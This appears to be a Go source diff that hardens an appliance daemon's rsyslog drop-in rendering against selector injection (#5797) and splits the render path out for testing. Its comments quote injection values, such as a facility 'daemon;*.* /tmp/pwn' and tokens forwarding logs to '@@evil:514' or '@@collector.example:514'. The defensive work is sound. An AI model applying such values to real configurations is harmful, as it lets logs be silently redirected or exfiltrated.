@@ -903,14 +903,23 @@ func (d *Daemon) applySystemSyslog(cfg *config.Config) {
 			// #5797: an UNMAPPED facility name silently resolved to local0 here,
 			// so records left under a facility the operator never authored and
 			// the collector's facility-based routing misfiled them with no
-			// signal anywhere. The strict commit gate
-			// (config.SystemSyslogFacilities via the schema's
-			// wildcardNameValidator) now rejects such a name, so this is only
-			// reachable on the tolerant load / peer-sync path (#1960 no-brick) —
-			// where the substitution must be VISIBLE rather than silent.
+			// signal anywhere.
+			//
+			// There is NO commit gate on this name. `<facility> <severity>` is a
+			// schema WILDCARD (syslogFacilitySeverityLeaf): the validator sits on
+			// the severity VALUE, and the facility KEY has none — so an ordinary
+			// `set system syslog host 10.0.0.1 authorization info` commits clean
+			// and arrives here. That is not an exotic tolerant-load case: Junos
+			// spells this vocabulary `authorization` / `kernel` /
+			// `interactive-commands`, and ParseFacility knows only the
+			// BSD/rsyslog spellings, so a correct-looking vSRX config is the
+			// COMMON way to hit it.
+			//
 			// Forwarding is deliberately NOT withheld: which facility a
 			// misconfigured host lands under is an availability-affecting
-			// contract question, and the selector redesign owns it.
+			// contract question, and the selector redesign owns it. The warning
+			// is the whole fix — TestApplySystemSyslogWarnsOnUnmappedFacility_5797
+			// pins that it fires.
 			raw := host.Facilities[0].Facility
 			facility, known := logging.ParseFacilityChecked(raw)
 			if !known {
@@ -937,7 +946,36 @@ func (d *Daemon) applySyslogFiles(cfg *config.Config) {
 	confDir := "/etc/rsyslog.d"
 	prefix := "10-xpf-"
 
-	// Collect desired configs
+	desired := syslogDropinContents(cfg, prefix)
+
+	// Reconcile the on-disk managed drop-ins against `desired`. A removal OR a
+	// (re)write flips `changed`, which gates the single restart below.
+	changed := reconcileSyslogDropins(confDir, prefix, desired)
+
+	if changed {
+		if out, err := runCommandTimeout("systemctl", "restart", "rsyslog"); err != nil {
+			slog.Error("failed to restart rsyslog",
+				"err", err, "output", strings.TrimSpace(string(out)))
+		} else {
+			slog.Info("rsyslog file configs applied", "files", len(desired))
+		}
+	}
+}
+
+// syslogDropinContents renders the xpf-managed rsyslog drop-ins for the
+// `system syslog file` and `system syslog user` destinations, keyed by drop-in
+// filename. It is the RENDER path: every value that reaches an rsyslog
+// selector line is validated here, and a destination that fails validation is
+// OMITTED from the returned map — which makes the caller's reconcile REMOVE any
+// drop-in a previous apply wrote for it, rather than merely declining to
+// rewrite it.
+//
+// Split out of applySyslogFiles (#5797 review) so the belts below are testable
+// at the site that actually consults them. Testing syslogSelectorTokenSafe in
+// isolation proves the predicate, not that the render path calls it; that gap
+// is exactly how a belt gets deleted with a green suite.
+// syslog_selector_render_5797_test.go drives this function.
+func syslogDropinContents(cfg *config.Config, prefix string) map[string]string {
 	desired := make(map[string]string) // filename -> content
 	if cfg.System.Syslog != nil {
 		for _, f := range cfg.System.Syslog.Files {
@@ -956,12 +994,24 @@ func (d *Daemon) applySyslogFiles(cfg *config.Config) {
 			}
 			// #5797 render belt: the facility and severity tokens are
 			// interpolated VERBATIM into the rsyslog selector below — the very
-			// line #4902 already belts the file NAME for, using the same
-			// leniently-loaded / peer-synced threat model. #4902 stopped one
+			// line #4902 already belts the file NAME for. #4902 stopped one
 			// field short: a selector metacharacter or control byte in either
 			// token escapes the intended selector and injects rsyslog
 			// configuration. Shape-check both, and skip the destination rather
 			// than write a drop-in built from an unsafe token.
+			//
+			// The two tokens have DIFFERENT reachability, and the facility is
+			// the worse one. The severity is a typed enum leaf at commit
+			// (syslogFacilitySeverityLeaf -> ValidateEnum(junosSyslogSeverities)),
+			// so an unsafe severity only arrives on the tolerant load /
+			// peer-sync path, like #4902's fields. The FACILITY is the schema's
+			// wildcard KEY and carries NO key validator, so
+			// `set system syslog file audit "daemon;*.* /tmp/pwn" info` passes
+			// SchemaValidate, compiles, and lands here verbatim from an ORDINARY
+			// operator commit. This belt is the only thing between that string
+			// and a written rsyslog directive.
+			// TestSyslogRenderUnsafeFacilityIsCommitReachable_5797 pins that
+			// chain end to end.
 			//
 			// This is deliberately a SHAPE check, not a facility-name allowlist.
 			// Closing the name set requires first reconciling the Junos facility
@@ -1011,8 +1061,9 @@ func (d *Daemon) applySyslogFiles(cfg *config.Config) {
 				continue
 			}
 			// #5797 render belt: same rsyslog-selector interpolation as the file
-			// destinations above, same tolerant-path threat model as the #4902
-			// user-token belt beside it.
+			// destinations above, and the same asymmetry — the severity is
+			// enum-gated at commit, the facility is an unvalidated wildcard KEY
+			// and reaches here verbatim from an ordinary commit.
 			if !syslogSelectorTokenSafe(u.Facility) || !syslogSelectorTokenSafe(u.Severity) {
 				slog.Warn("skipping syslog user destination with unsafe selector token (#5797)",
 					"user", u.User, "facility", u.Facility, "severity", u.Severity)
@@ -1036,19 +1087,7 @@ func (d *Daemon) applySyslogFiles(cfg *config.Config) {
 			desired[confFile] = content
 		}
 	}
-
-	// Reconcile the on-disk managed drop-ins against `desired`. A removal OR a
-	// (re)write flips `changed`, which gates the single restart below.
-	changed := reconcileSyslogDropins(confDir, prefix, desired)
-
-	if changed {
-		if out, err := runCommandTimeout("systemctl", "restart", "rsyslog"); err != nil {
-			slog.Error("failed to restart rsyslog",
-				"err", err, "output", strings.TrimSpace(string(out)))
-		} else {
-			slog.Info("rsyslog file configs applied", "files", len(desired))
-		}
-	}
+	return desired
 }
 
 // reconcileSyslogDropins removes stale xpf-managed rsyslog drop-ins (any file
@@ -1939,13 +1978,17 @@ func (d *Daemon) applyRootAuth(cfg *config.Config) (retErr error) {
 // token can be interpolated into an rsyslog selector line without escaping it
 // (#5797).
 //
-// applySyslogFiles / applySyslogUsers build `<facility>.<severity>\t<target>`
-// and write it to a managed drop-in under /etc/rsyslog.d. #4902 already belts
-// the file NAME and the user TOKEN on that same line against leniently-loaded
-// and peer-synced values, but left the two selector tokens unchecked — a
-// newline, a `;` (rsyslog statement separator), a `.`/`*` (selector grammar) or
-// a control byte in either one escapes the intended selector and injects
-// rsyslog configuration.
+// syslogDropinContents builds `<facility>.<severity>\t<target>` and writes it
+// to a managed drop-in under /etc/rsyslog.d. #4902 already belts the file NAME
+// and the user TOKEN on that same line, but left the two selector tokens
+// unchecked — a newline, a `;` (rsyslog statement separator), a `.`/`*`
+// (selector grammar) or a control byte in either one escapes the intended
+// selector and injects rsyslog configuration.
+//
+// The severity reaches this only on the tolerant load / peer-sync path (it is
+// an enum leaf at commit). The FACILITY reaches it from an ordinary commit: it
+// is the schema's wildcard KEY and has no key validator, so
+// `set system syslog file audit "daemon;*.* /tmp/pwn" info` commits clean.
 //
 // Empty is SAFE and expected: both call sites map an empty token to the `*`
 // wildcard before building the selector, so an unset facility/severity is
@@ -1957,12 +2000,13 @@ func (d *Daemon) applyRootAuth(cfg *config.Config) (retErr error) {
 // the classic "terminate the line and write a fresh directive" injection is
 // not reachable through the config surface. But a newline is not required.
 // Spaces and every rsyslog metacharacter survive VERBATIM — a quoted
-// `"daemon;*.*"` arrives intact, a bare `*.*` arrives intact, and a severity
-// of `"info *.* @@evil:514"` arrives intact. Because the emitted line is
+// `"daemon;*.*"` arrives intact and a bare `*.*` arrives intact, on the
+// FACILITY straight through SchemaValidate + CompileConfig, and on the
+// severity via the tolerant load / peer-sync path. Because the emitted line is
 // `<facility>.<severity>\t<target>` and rsyslog's grammar is
 // `<selector><whitespace><action>`, a token containing a SPACE can push text
-// into the ACTION position of a managed rsyslog line — e.g. a severity of
-// `* @@collector.example:514` renders `daemon.* @@collector.example:514`
+// into the ACTION position of a managed rsyslog line — e.g. a facility of
+// `* @@collector.example:514` renders `* @@collector.example:514.info`
 // ahead of the intended target. Whether rsyslog honours any specific such
 // construction is NOT verified here (no rsyslog in the dev/CI environment), so
 // this is deliberately not claimed as proven remote-forward exfiltration; it
